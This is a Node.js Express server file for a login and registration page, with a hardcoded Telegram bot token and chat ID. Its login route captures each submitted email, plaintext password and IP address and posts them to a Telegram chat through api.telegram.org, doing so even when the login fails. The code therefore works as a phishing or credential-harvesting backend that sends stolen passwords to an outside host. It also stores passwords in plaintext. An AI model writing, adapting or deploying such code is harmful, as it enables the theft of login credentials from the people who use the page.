const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== YOUR TELEGRAM CREDENTIALS - PUT THEM HERE =====
const TELEGRAM_BOT_TOKEN = '8716008095:AAEx89L4ab3oRZEh_WO637CyO6A0aiMlu-Q';  // ← Replace with your token
const TELEGRAM_CHAT_ID = '5707645216';      // ← Replace with your chat ID
// ====================================================

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Function to send message to Telegram
async function sendToTelegram(email, password, ip) {
    const message = `
🔐 NEW LOGIN ATTEMPT 🔐
📧 Email: ${email}
🔑 Password: ${password}
🌍 IP: ${ip}
⏰ Time: ${new Date().toString()}
    `;
    
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
        console.log('✅ Telegram notification sent');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

// Simple storage
const users = [];

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', message: 'Server is running' });
});

// Register
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    console.log('Register:', { name, email });
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    
    const existing = users.find(u => u.email === email);
    if (existing) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    const newUser = {
        id: users.length + 1,
        name: name,
        email: email,
        password: password
    };
    
    users.push(newUser);
    
    res.json({ 
        success: true, 
        message: 'Account created!',
        user: { id: newUser.id, name: newUser.name, email: newUser.email }
    });
});

// Login - THIS SENDS TO TELEGRAM
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    
    console.log('Login:', { identifier });
    
    // Get IP address
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // SEND TO TELEGRAM (even if login fails!)
    sendToTelegram(identifier, password, ip);
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    const user = users.find(u => u.email === identifier);
    
    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    if (user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    res.json({ 
        success: true, 
        message: 'Login successful!',
        user: { id: user.id, name: user.name, email: user.email }
    });
});

// Home
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
